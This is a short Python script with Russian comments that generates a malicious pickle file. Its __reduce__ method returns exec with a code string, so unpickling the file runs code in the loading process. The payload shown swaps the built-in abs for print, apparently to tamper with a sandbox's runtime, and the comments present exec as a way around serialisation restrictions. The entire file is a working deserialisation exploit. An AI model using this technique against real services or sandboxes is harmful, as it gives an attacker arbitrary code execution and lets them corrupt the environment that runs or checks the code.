import pickle

class RuntimeAttackPayload:
    def __reduce__(self):
        # Используем встроенную функцию exec, которая позволяет выполнить 
        # любой Python-код прямо в памяти текущего процесса.
        # Это абсолютно легитимная функция с точки зрения pickle (она находится в builtins),
        # но передача в неё строки позволяет обойти любые ограничения на сериализацию модулей.
        
        import builtins
        
        # Код, который выполнится внутри вашей песочницы:
        # Он берет встроенный модуль и меняет функцию abs на print
        payload_code = "import builtins; builtins.setattr(builtins, 'abs', builtins.print)"
        
        return (builtins.exec, (payload_code,))

# Генерация
try:
    binary_data = pickle.dumps(RuntimeAttackPayload())
    with open("./evil_runtime.pkl", "wb") as f:
        f.write(binary_data)
    print("[+] Файл evil_runtime.pkl успешно сгенерирован!")
except Exception as e:
    print(f"[-] Ошибка: {e}")
